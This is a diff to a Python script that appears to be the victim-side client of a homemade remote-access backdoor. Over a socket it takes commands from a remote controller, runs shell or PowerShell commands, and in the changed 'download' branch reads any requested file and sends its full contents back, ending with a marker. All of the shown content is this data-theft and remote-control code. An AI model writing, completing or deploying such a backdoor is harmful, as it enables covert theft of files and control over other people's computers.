@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess
+import time 
 
 CHUNK_SIZE = 1024
 identifier = "<END OF FILE>"
@@ -34,19 +35,36 @@ while True:
             print("not exist")
             message = "path doesnot exit"
 
+
+
     elif command.startswith("download"):
         filename = command.strip("download ")
         if os.path.exists(filename):
-            message = "yes it this file exits"
+            status = "Yess"
+            s.send(status.encode())
+        else:
+            status = "Nope"
+            s.send(status.encode())
+            continue
+
+          
+        if status == "Yess":
             with open (filename,"rb") as f :
                 data = f.read(CHUNK_SIZE)
-                while len(data)!=0:
-                    s.sendall(data)
+                sender = b""
+                while len(data)!= 0:
+                    sender += data
                     data =f.read(CHUNK_SIZE)
 
-                s.send(identifier.encode())
-        else:
-            message = "file not exist"
+                sender += identifier.encode()
+                print(sender.decode())
+                s.send(sender)
+                continue
+
+
+
+
+
 
     #for running a command on pwershell
     else:
